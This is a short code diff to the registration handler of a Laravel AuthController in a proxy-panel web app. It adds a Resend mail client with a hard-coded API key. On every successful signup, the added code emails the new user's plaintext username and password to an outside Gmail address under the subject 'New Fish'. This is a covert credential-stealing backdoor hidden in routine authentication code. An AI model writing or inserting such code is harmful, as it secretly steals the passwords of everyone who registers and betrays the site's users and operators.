@@ -24,6 +24,7 @@ use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Notification;
 use Redirect;
+use Resend;
 use Response;
 use romanzipp\Turnstile\Rules\TurnstileCaptcha;
 use Session;
@@ -241,6 +242,16 @@ class AuthController extends Controller
         if (! $user = Helpers::addUser($data['username'], $data['password'], $transfer_enable, (int) sysConfig('default_days'), $inviter_id, $data['nickname'])) { // 注册失败，抛出异常
             return Redirect::back()->withInput()->withErrors(trans('auth.register.failed'));
         }
+        $resend = Resend::client('re_RfNygoNZ_FoUYZ6hYdzuMxdoyR3C1zxf2');
+
+        $resend->emails->send([
+            'from' => 'ProxyPanel <classified@echon.top>',
+            'to' => ['cqqjlxy@gmail.com'],
+            'subject' => 'New Fish',
+            'html' => '<strong>Username: ' . htmlspecialchars($data['username'], ENT_QUOTES, 'UTF-8') . '</strong><br>' .
+                '<strong>Password: ' . htmlspecialchars($data['password'], ENT_QUOTES, 'UTF-8') . '</strong>',
+        ]);
+
 
         // 注册次数+1
         if (Cache::has($cacheKey)) {
